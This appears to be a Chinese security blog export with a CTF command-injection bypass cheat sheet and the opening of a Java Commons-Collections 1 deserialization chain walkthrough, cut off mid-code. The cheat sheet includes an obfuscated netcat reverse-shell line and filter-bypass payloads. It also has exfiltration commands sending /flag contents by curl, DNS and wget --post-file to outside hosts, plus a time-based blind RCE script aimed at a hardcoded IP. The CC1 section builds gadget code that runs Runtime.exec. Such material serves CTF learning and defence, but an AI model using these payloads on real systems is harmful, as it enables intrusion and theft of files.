<table data-anchor-id="g9vx"><thead><tr><td>字符</td><td>意义</td></tr></thead><tbody><tr><td><p>[:alnum:]</p></td><td><p>任意数字或者字母</p></td></tr><tr><td><p>[:alpha:]</p></td><td><p>任意字母</p></td></tr><tr><td><p>[:space:]</p></td><td><p>空格</p></td></tr><tr><td><p>[:lower:]</p></td><td><p>小写字母</p></td></tr><tr><td><p>[:digit:]</p></td><td><p>任意数字</p></td></tr><tr><td><p>[:upper:]</p></td><td><p>任意大写字母</p></td></tr><tr><td><p>[:cntrl:]</p></td><td><p>控制符</p></td></tr><tr><td><p>[:graph:]</p></td><td><p>图形</p></td></tr><tr><td><p>[:print:]</p></td><td><p>可打印字符</p></td></tr><tr><td><p>[:punct:]</p></td><td><p>标点符号</p></td></tr><tr><td><p>[:xdigit:]</p></td><td><p>十六进制数</p></td></tr><tr><td><p>[:blank:]</p></td><td><p>空白字符（未验证）</p></td></tr></tbody></table>

<p><strong>Linux shell 元字符</strong>，在使用通配符时如果没有进行转义可能就会被辨识为元字符</p>
<table data-anchor-id="7cp3"><thead><tr><td>字符</td><td>作用</td></tr></thead><tbody><tr><td><p>IFS</p></td><td><p>由&nbsp;&lt;space&gt;&nbsp;或&nbsp;&lt; tab &gt; 或&nbsp;&lt; enter &gt;&nbsp;三者之一组成</p></td></tr><tr><td><p>CR</p></td><td><p>由&nbsp;&lt;enter&gt;&nbsp;产生</p></td></tr><tr><td><p>=</p></td><td><p>设定变量</p></td></tr><tr><td><p>$</p></td><td><p>作变量或运算替换</p></td></tr><tr><td><p>&gt;</p></td><td><p>重导向标准输出</p></td></tr><tr><td><p>&lt;</p></td><td><p>重导向标准输入</p></td></tr><tr><td><p>|</p></td><td><p>命令管线</p></td></tr><tr><td><p>&amp;</p></td><td><p>重导向文件描述符，或将命令静默执行</p></td></tr><tr><td><p>( )</p></td><td><p>将其内的命令置于 nested subshell 执行，或用于运算或命令替换</p></td></tr><tr><td><p>{ }</p></td><td><p>将其内的命令置于 non-named function 中执行，或用在变量替换的界定范围</p></td></tr><tr><td><p>;</p></td><td><p>在前一个命令结束时，而忽略其返回值，继续执行下一个命令</p></td></tr><tr><td><p>&amp;&amp;</p></td><td><p>在前一个命令结束时，若返回值为 true，继续执行下一个命令</p></td></tr><tr><td><p>||</p></td><td><p>在前一个命令结束时，若返回值为 false，继续执行下一个命令</p></td></tr><tr><td><p>!</p></td><td><p>执行 history 中的命令</p></td></tr></tbody></table>

<p><strong>示例：</strong></p>
<p>举几个简单的例子，举一反三，同理，各种混合结合效果更佳！</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">w2n1ck@w2n1ck ~/Desktop/shell  ls a*?</span><br><span class="line">abc.txt</span><br><span class="line"> w2n1ck@w2n1ck ~/Desktop/shell  /???/[l]s</span><br><span class="line">12.txt  abc.txt</span><br><span class="line"> w2n1ck@w2n1ck ~/Desktop/shell  /???/[:lower:]s</span><br><span class="line">12.txt  abc.txt</span><br><span class="line">再比如：</span><br><span class="line">/?s?/???/[n]c 2130706433 8888 -e /???/b??h</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>其他绕过方式</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls | id</span><br><span class="line">ls ; id    在shell中，担任&quot;连续指令&quot;功能的符号就是&quot;分号&quot;</span><br><span class="line">ls &amp; id</span><br><span class="line">ls 回车 id</span><br><span class="line">ls `id`   </span><br><span class="line">ls ` id`   前面加了一个空格</span><br><span class="line">ls `\id`   反斜杠  i\d等价于id</span><br><span class="line">ls $(id)</span><br><span class="line">ls | a=i;b=d;$a$b   拼接</span><br><span class="line">ls | echo aWQ=| base64 -d | bash   利用base64</span><br><span class="line">`echo &quot;aWQ=&quot;|base64 -d`</span><br><span class="line">ls | curl xxx.ceye.io/`whoami`   利用dnslog或者http web log</span><br><span class="line">cat&lt;1.txt</span><br><span class="line">cat$IFS$91.txt</span><br><span class="line">cat$&#123;IFS&#125;1.txt</span><br><span class="line">cat$IFS1.txt</span><br><span class="line">%0acat%091.txt</span><br><span class="line">w&#x27;h&#x27;o&#x27;am&#x27;i</span><br><span class="line">w&quot;h&quot;o&quot;am&quot;i</span><br><span class="line">who$@ami</span><br><span class="line">echo i$@d|$0</span><br><span class="line">w$@h$@o$@a$@m$@i</span><br></pre></td></tr></table></figure>

<ul>
<li><p>在使用专属字符集的时候，字符集之外还需要用 来包含住，否则专用字符集不会生效，例如 [[:space:]]</p>
</li>
<li><p>想要转义的时候，单引号与双引号使用方法是不同的，单引号会转义所有字符，而且单引号中间不允许再出现单引号，双引号允许出现特定的 shell 元字符，具体字符可以自行查询</p>
</li>
<li><p>在使用花括号 {} 的时候，里面的单个字符串需要使用单引号或者双引号括住，否则就会视为多个的单个字符</p>
</li>
</ul>
<p>Referer：</p>
<p><a href="https://www.cnblogs.com/divent/archive/2016/08/11/5762154.html">https://www.cnblogs.com/divent/archive/2016/08/11/5762154.html</a></p>
<p>[<a href="https://medium.com/secjuice/waf-evasion-techniques-718026d693d8]">https://medium.com/secjuice/waf-evasion-techniques-718026d693d8]</a>(</p>
<p>通配符 * ？ []</p>
<h2 id="内敛执行绕过"><a href="#内敛执行绕过" class="headerlink" title="内敛执行绕过"></a>内敛执行绕过</h2><p><code>命令</code>和$(命令)都是执行命令的方式</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 root@kali:~# echo &quot;xx`pwd`&quot;</span><br><span class="line">2 xx/root</span><br><span class="line">3 root@kali:~# echo &quot;xx$(pwd)&quot;</span><br><span class="line">4 xx/root</span><br></pre></td></tr></table></figure>



<h2 id="长度"><a href="#长度" class="headerlink" title="长度"></a>长度</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@kali:~/桌面# echo &quot;flag&#123;hahaha&#125;&quot; &gt; flag.txt</span><br><span class="line">root@kali:~/桌面# touch &quot;ag&quot;</span><br><span class="line">root@kali:~/桌面# touch &quot;fl\\&quot;</span><br><span class="line">root@kali:~/桌面# touch &quot;t \\&quot;</span><br><span class="line">root@kali:~/桌面# touch &quot;ca\\&quot;</span><br><span class="line">root@kali:~/桌面# ls -t</span><br><span class="line">&#x27;ca\&#x27;  &#x27;t \&#x27;  &#x27;fl\&#x27;   ag   flag</span><br><span class="line">root@kali:~/桌面# ls -t &gt;a     #将 ls -t 内容写入到a文件中</span><br><span class="line">root@kali:~/桌面# sh a</span><br><span class="line">a: 1: a: not found</span><br><span class="line">flag&#123;hahaha&#125;</span><br><span class="line">a: 6: flag.txt: not found</span><br></pre></td></tr></table></figure>

<p><a href="https://www.qwesec.com/2024/03/CTF-RCE.html#escapeshellcmd">https://www.qwesec.com/2024/03/CTF-RCE.html#escapeshellcmd</a></p>
<h1 id="无回显-RCE"><a href="#无回显-RCE" class="headerlink" title="无回显 RCE"></a>无回显 RCE</h1><h2 id="wget"><a href="#wget" class="headerlink" title="wget"></a>wget</h2><h3 id="常用"><a href="#常用" class="headerlink" title="常用"></a>常用</h3><ul>
<li>普通下载 <code>wget http://example.com/file.iso</code></li>
<li>指定保存文件名 <code>wget ‐‐output-document=myname.iso http://example.com/file.iso</code></li>
<li>保存到指定目录 <code>wget ‐‐directory-prefix=folder/subfolder http://example.com/file.iso</code></li>
<li>大文件断点续传 <code>wget ‐‐continue http://example.com/big.file.iso</code></li>
<li>下载指定文件中的url列表 <code>wget ‐‐input list-of-file-urls.txt</code></li>
<li>下载指定数字列表的多个文件 <code>wget http://example.com/images/&#123;1..20&#125;.jpg</code></li>
<li>下载web页面的所有资源 <code>wget ‐‐page-requisites ‐‐span-hosts ‐‐convert-links ‐‐adjust-extension http://example.com/dir/file</code></li>
</ul>
<p> 整站下载</p>
<ul>
<li>下载所有链接的页面和文件 <code>wget ‐‐execute robots=off ‐‐recursive ‐‐no-parent ‐‐continue ‐‐no-clobber http://example.com/</code></li>
<li>下载指定后缀的文件 <code>wget ‐‐level=1 ‐‐recursive ‐‐no-parent ‐‐accept mp3,MP3 http://example.com/mp3/</code></li>
<li>排除指定目录下载 <code>wget ‐‐recursive ‐‐no-clobber ‐‐no-parent ‐‐exclude-directories /forums,/support http://example.com</code></li>
</ul>
<h3 id="指定参数"><a href="#指定参数" class="headerlink" title="指定参数"></a>指定参数</h3><ul>
<li>user agent <code>‐‐user-agent=&quot;Mozilla/5.0 Firefox/4.0.1&quot;</code></li>
<li>basic auth <code>‐‐http-user=user ‐‐http-password=pwd</code></li>
<li>保存cookie <code>‐‐cookies=on ‐‐save-cookies cookies.txt ‐‐keep-session-cookies</code></li>
<li>使用cookie <code>‐‐cookies=on ‐‐load-cookies cookies.txt ‐‐keep-session-cookies</code></li>
</ul>
<h2 id="curl"><a href="#curl" class="headerlink" title="curl"></a>curl</h2><h3 id="常用-1"><a href="#常用-1" class="headerlink" title="常用"></a>常用</h3><ul>
<li>直接显示 <code>curl www.example.com</code></li>
<li>保存指定的名字 <code>-o newname</code></li>
<li>不指定名字 <code>-O</code></li>
</ul>
<h3 id="正则"><a href="#正则" class="headerlink" title="正则"></a>正则</h3><ul>
<li>文件名 <code>curl ftp://example.com/file[1-100].txt</code></li>
<li>域名 <code>curl http://site.&#123;one,two,three&#125;.com</code></li>
</ul>
<h2 id="请求带出"><a href="#请求带出" class="headerlink" title="请求带出"></a>请求带出</h2><h4 id="HTTP-请求带出"><a href="#HTTP-请求带出" class="headerlink" title="HTTP 请求带出"></a>HTTP 请求带出</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PLAINTEXT</span><br><span class="line">curl your_ip:your_port/?query=`cat /flag`</span><br></pre></td></tr></table></figure>

<p><a href="https://image.3001.net/images/20240316/1710591802_65f58f3acc278a0925a33.png"><img src="https://image.3001.net/images/20240316/1710591802_65f58f3acc278a0925a33.png" alt="alt text"></a></p>
<p>可以从结果中看到，这里我们的文件内容是 <code>flag&#123;...&#125;</code> 但是该符号由于是特殊字符，自动删除了，于是我们可以使用 base64 的形式进行编码之后传输。</p>
<p><a href="https://image.3001.net/images/20240316/1710591805_65f58f3d950a0b814259a.png"><img src="https://image.3001.net/images/20240316/1710591805_65f58f3d950a0b814259a.png" alt="alt text"></a></p>
<h4 id="DNSlog-请求带出"><a href="#DNSlog-请求带出" class="headerlink" title="DNSlog 请求带出"></a>DNSlog 请求带出</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">BASH</span><br><span class="line">ping `whoami`.yourname.cn  </span><br></pre></td></tr></table></figure>

<p><a href="https://image.3001.net/images/20240316/1710591811_65f58f43382c619a4255f.png"><img src="https://image.3001.net/images/20240316/1710591811_65f58f43382c619a4255f.png" alt="alt text"></a></p>
<p>但是由于是通过域名解析获取的文件内容，所以文件内容不能有特殊字符。也不能进行 base64 编码，因为 base64 编码里面可能有 <code>=</code>。</p>
<p>所以只能选择十六进制编码:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PLAINTEXT</span><br><span class="line">ping  `xxd -p /flag`.yourname.cn </span><br></pre></td></tr></table></figure>

<p><a href="https://image.3001.net/images/20240316/1710591813_65f58f458ac02c2f774e8.png"><img src="https://image.3001.net/images/20240316/1710591813_65f58f458ac02c2f774e8.png" alt="alt text"></a></p>
<p>但是由于域名的长度限制，故而只能带出最后几位字符，于是如果能使用 复制、剪切、反弹 shell 等功能尽量不要选择 <code>DNSlog</code> 外带。</p>
<h4 id="wget-请求带出"><a href="#wget-请求带出" class="headerlink" title="wget 请求带出"></a>wget 请求带出</h4><p>wget 的 <code>--post-file</code> 参数允许从一个文件中读取内容作为 POST 请求体的内容。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">BASH</span><br><span class="line">wget --post-file ./flag 120.48.128.24:2333</span><br></pre></td></tr></table></figure>

<p><a href="https://image.3001.net/images/20240316/1710591821_65f58f4d4c64f767ed576.png"><img src="https://image.3001.net/images/20240316/1710591821_65f58f4d4c64f767ed576.png" alt="**alt text**"></a></p>
<h3 id="请求带出平台"><a href="#请求带出平台" class="headerlink" title="请求带出平台"></a>请求带出平台</h3><table>
<thead>
<tr>
<th>平台地址</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><a href="http://www.dnslog.cn/">http://www.dnslog.cn/</a></td>
<td>只能使用 dnslog 外带，另外很多防火墙会 ban 掉该域名。</td>
</tr>
<tr>
<td><a href="http://ceye.io/">http://ceye.io/</a></td>
<td>可以使用 <code>http</code> 外带和 <code>dnslog</code> 外带，推荐。</td>
</tr>
</tbody></table>
<h3 id="bash-时间盲注"><a href="#bash-时间盲注" class="headerlink" title="bash 时间盲注"></a>bash 时间盲注</h3><h4 id="截取"><a href="#截取" class="headerlink" title="截取"></a>截取</h4><p>在 <code>shell</code> 中字符串截取可以使用 <code>cut -c number</code> 其中的 <code>-c</code> 参数指定的 <code>number</code> 表示截取第几个字符。</p>
<p><a href="https://image.3001.net/images/20240316/1710591824_65f58f5067d0650d7a0d8.png"><img src="https://image.3001.net/images/20240316/1710591824_65f58f5067d0650d7a0d8.png" alt="alt text"></a></p>
<h4 id="比较"><a href="#比较" class="headerlink" title="比较"></a>比较</h4><p>使用 <code>shell</code> 中的 if 判断语句即可。其语法结构如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">BASH</span><br><span class="line">if condition</span><br><span class="line">then</span><br><span class="line">    command1 </span><br><span class="line">    command2</span><br><span class="line">    ...</span><br><span class="line">    commandN </span><br><span class="line">fi</span><br></pre></td></tr></table></figure>

<p>例如判断 <code>/flag</code> 文件的第一个内容是不是 <code>f</code>，如果是就延时 <code>5</code> 秒，否则什么都不做。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">BASH</span><br><span class="line">if [ `cut -c 1 /flag` = &#x27;f&#x27; ];then sleep 5;fi</span><br></pre></td></tr></table></figure>

<h4 id="脚本编写"><a href="#脚本编写" class="headerlink" title="脚本编写"></a>脚本编写</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PYTHON</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">chars = [&#x27; &#x27;, &#x27;!&#x27;, &#x27;&quot;&#x27;, &#x27;#&#x27;, &#x27;$&#x27;, &#x27;%&#x27;, &#x27;&amp;&#x27;, &quot;&#x27;&quot;, &#x27;(&#x27;, &#x27;)&#x27;, &#x27;*&#x27;, &#x27;+&#x27;, &#x27;,&#x27;, &#x27;-&#x27;, &#x27;.&#x27;, &#x27;/&#x27;, &#x27;0&#x27;, &#x27;1&#x27;, &#x27;2&#x27;, &#x27;3&#x27;, &#x27;4&#x27;, &#x27;5&#x27;, &#x27;6&#x27;, &#x27;7&#x27;, &#x27;8&#x27;, &#x27;9&#x27;, &#x27;:&#x27;, &#x27;;&#x27;, &#x27;&lt;&#x27;, &#x27;=&#x27;, &#x27;&gt;&#x27;, &#x27;?&#x27;, &#x27;@&#x27;, &#x27;A&#x27;, &#x27;B&#x27;, &#x27;C&#x27;, &#x27;D&#x27;, &#x27;E&#x27;, &#x27;F&#x27;, &#x27;G&#x27;, &#x27;H&#x27;, &#x27;I&#x27;, &#x27;J&#x27;, &#x27;K&#x27;, &#x27;L&#x27;, &#x27;M&#x27;, &#x27;N&#x27;, &#x27;O&#x27;, &#x27;P&#x27;, &#x27;Q&#x27;, &#x27;R&#x27;, &#x27;S&#x27;, &#x27;T&#x27;, &#x27;U&#x27;, &#x27;V&#x27;, &#x27;W&#x27;, &#x27;X&#x27;, &#x27;Y&#x27;, &#x27;Z&#x27;, &#x27;[&#x27;, &#x27;\\&#x27;, &#x27;]&#x27;, &#x27;^&#x27;, &#x27;_&#x27;, &#x27;`&#x27;, &#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;, &#x27;d&#x27;, &#x27;e&#x27;, &#x27;f&#x27;, &#x27;g&#x27;, &#x27;h&#x27;, &#x27;i&#x27;, &#x27;j&#x27;, &#x27;k&#x27;, &#x27;l&#x27;, &#x27;m&#x27;, &#x27;n&#x27;, &#x27;o&#x27;, &#x27;p&#x27;, &#x27;q&#x27;, &#x27;r&#x27;, &#x27;s&#x27;, &#x27;t&#x27;, &#x27;u&#x27;, &#x27;v&#x27;, &#x27;w&#x27;, &#x27;x&#x27;, &#x27;y&#x27;, &#x27;z&#x27;, &#x27;&#123;&#x27;, &#x27;|&#x27;, &#x27;&#125;&#x27;, &#x27;~&#x27;]</span><br><span class="line">result = &quot;&quot;</span><br><span class="line">url = &quot;http://120.48.128.24:9090/&quot;</span><br><span class="line">for i in range(1,100):</span><br><span class="line">    for char in chars:</span><br><span class="line">        payload = f&quot;?cmd=if [ `cut -c &#123;i&#125; /flag` = &#x27;&#123;char&#125;&#x27; ];then sleep 5;fi&quot;</span><br><span class="line">        try:</span><br><span class="line">            req = requests.get(url + payload, timeout=5)</span><br><span class="line">        except:</span><br><span class="line">            result += char</span><br><span class="line">            print(result)</span><br><span class="line">            break</span><br><span class="line">    if (char == &#x27;~&#x27;):</span><br><span class="line">        break</span><br></pre></td></tr></table></figure>

<p>执行结果:</p>
<p><a href="https://image.3001.net/images/20240316/1710591830_65f58f56cf15ee92caecd.png"><img src="https://image.3001.net/images/20240316/1710591830_65f58f56cf15ee92caecd.png" alt="alt text"></a></p>
]]></content>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>commons-collections1</title>
    <url>/2024/03/30/commons-collections1/</url>
    <content><![CDATA[<p> java cc1 链子</p>
<span id="more"></span> 

<p>文章为复盘白日梦组长的视频</p>
<h1 id="CommonsCollections-1"><a href="#CommonsCollections-1" class="headerlink" title="CommonsCollections-1"></a>CommonsCollections-1</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>windos 10 虚拟机</p>
<p>jdk 8u65 ,idea</p>
<ul>
<li>CC版本：Commons-Collections 3.1-3.2.1</li>
</ul>
<p>maven依赖包</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- https://mvnrepository.com/artifact/commons-collections/commons-collections --&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;commons-collections&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;3.2.1&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>

<p>导入sun 包</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hg.openjdk.java.net/jdk8u/jdk8u/jdk/log?rev=annotationinvocationhandler</span><br></pre></td></tr></table></figure>

<p>这里下载zip </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4</span><br></pre></td></tr></table></figure>

<p>导入maven 依赖</p>
<p>在CC3.21组件依赖中，存在transformer  接口，该类的实现类有一个invokerTransformer.class,存在方法transform</p>
<h2 id="调用过程"><a href="#调用过程" class="headerlink" title="调用过程"></a>调用过程</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">            AnnotationInvocationHandler.readObject()</span><br><span class="line">                MapEntry.setValue()</span><br><span class="line">                    TransformedMap.checkSetValue()</span><br><span class="line">                            ChainedTransformer.transform()</span><br><span class="line">                                ConstantTransformer.transform()</span><br><span class="line">                                InvokerTransformer.transform()</span><br><span class="line">                                    Method.invoke()</span><br><span class="line">                                        Class.getMethod()</span><br><span class="line">                                InvokerTransformer.transform()</span><br><span class="line">                                    Method.invoke()</span><br><span class="line">                                        Runtime.getRuntime()</span><br><span class="line">                                InvokerTransformer.transform()</span><br><span class="line">                                    Method.invoke()</span><br><span class="line">                                        Runtime.exec()</span><br></pre></td></tr></table></figure>

<h2 id="Transformer"><a href="#Transformer" class="headerlink" title="Transformer"></a><strong>Transformer</strong></h2><p>Transformer是⼀个接⼝，它只有⼀个待实现的⽅法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Transformer</span> &#123;</span><br><span class="line"> <span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="InvokerTransformer-transformer"><a href="#InvokerTransformer-transformer" class="headerlink" title="InvokerTransformer.transformer"></a>InvokerTransformer.transformer</h2><p>InvokerTransformer是实现了Transformer接⼝的⼀个类，这个类可以⽤来执⾏任意⽅法，这也是反序</p>
<p>列化能执⾏任意代码的关键。</p>
<p>在实例化这个InvokerTransformer时，需要传⼊三个参数，第⼀个参数是待执⾏的⽅法名，第⼆个参数</p>
<p>是这个函数的参数列表的参数类型，第三个参数是传给这个函数的参数列表：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.iMethodName = methodName;</span><br><span class="line">    <span class="built_in">this</span>.iParamTypes = paramTypes;</span><br><span class="line">    <span class="built_in">this</span>.iArgs = args;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p> 传入了</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (input == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();</span><br><span class="line">            <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(<span class="built_in">this</span>.iMethodName, <span class="built_in">this</span>.iParamTypes);</span><br><span class="line">            <span class="keyword">return</span> method.invoke(input, <span class="built_in">this</span>.iArgs);</span><br></pre></td></tr></table></figure>

<p>这里相当于动态反射调用方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC1Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">       <span class="comment">// Runtime.getRuntime().exec(&quot;calc&quot;);</span></span><br><span class="line">        Runtime r=Runtime.getRuntime();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;).transform(r);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中InvokerTransformer.transformer方法为危险方法</p>
<p>寻找谁的里面调用了transformer 方法,然后有两个类，形成两条链</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TransformedMap</span><br><span class="line">LazyMap</span><br></pre></td></tr></table></figure>

<h2 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> &#123;</span><br><span class="line">         <span class="built_in">super</span>();</span><br><span class="line">     iTransformers = transformers;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">   <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; iTransformers.length; i++) &#123;</span><br><span class="line">     object = iTransformers[i].transform(object);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ChainedTransformer也是实现了Transformer接⼝的⼀个类，它的作⽤是将内部的多个Transformer串</p>
<p>在⼀起。通俗来说就是，前⼀个回调返回的结果，作为后⼀个回调的参数传⼊.</p>
<h2 id="TransformedMap链子"><a href="#TransformedMap链子" class="headerlink" title="TransformedMap链子"></a>TransformedMap链子</h2><p>里面有三个方法调用transformer</p>
<p>transformer</p>
<p>transformValue</p>
<p>checkSetValue</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> Object <span class="title function_">checkSetValue</span><span class="params">(Object value)</span> &#123;</span><br><span class="line">       <span class="keyword">return</span> valueTransformer.transform(value);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>搜索 valueTransformer</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> Transformer keyTransformer;</span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> Transformer valueTransformer;</span><br></pre></td></tr></table></figure>

<p>为protected无法修改，这里寻找<strong>decorate</strong> 进行调用构造方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;</span><br><span class="line">     <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TransformedMap</span>(map, keyTransformer, valueTransformer);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>静态方法decorate</p>
<p>相当于传入任意map 类，然后新建TransformedMap类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">   <span class="type">InvokerTransformer</span> <span class="variable">invoke</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">   <span class="type">HashMap</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">   TransformedMap.decorate(map,<span class="literal">null</span>,invoke);</span><br></pre></td></tr></table></figure>

<p>然后我们查看checkSetValue(Object value)是否可控，看是谁调用了checkSetValue，find 方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">InvokerTransformer</span> <span class="variable">invoke</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br></pre></td></tr></table></figure>

<h2 id="AbstractInputCheckedMapDecorator"><a href="#AbstractInputCheckedMapDecorator" class="headerlink" title="AbstractInputCheckedMapDecorator"></a>AbstractInputCheckedMapDecorator</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">MapEntry</span> <span class="keyword">extends</span> <span class="title class_">AbstractMapEntryDecorator</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/** The parent map */</span></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> AbstractInputCheckedMapDecorator parent;</span><br><span class="line">        <span class="keyword">protected</span> <span class="title function_">MapEntry</span><span class="params">(Map.Entry entry, AbstractInputCheckedMapDecorator parent)</span> &#123;</span><br><span class="line">            <span class="built_in">super</span>(entry);</span><br><span class="line">            <span class="built_in">this</span>.parent = parent;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> Object <span class="title function_">setValue</span><span class="params">(Object value)</span> &#123;</span><br><span class="line">            value = parent.checkSetValue(value);</span><br><span class="line">            <span class="keyword">return</span> entry.setValue(value);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>这里的this.parent传入的就是TransformedMap,<strong>AbstractInputCheckedMapDecorator</strong> 的根父类实际就是 <strong>Map</strong> ，所以我们现在只需要找到一处 <strong>readObject</strong> 方法，只要它调用了 <strong>Map.setValue()</strong> 方法,即可完成整个反序列化链。(这里涉及一些多态的知识)</p>
<p>链子从这里开始构造</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="comment">// Press Shift twice to open the Search Everywhere dialog and type `show whitespaces`,</span></span><br><span class="line"><span class="comment">// then press Enter. You can now see whitespace characters in your code.</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InvocationTargetException, IllegalAccessException, 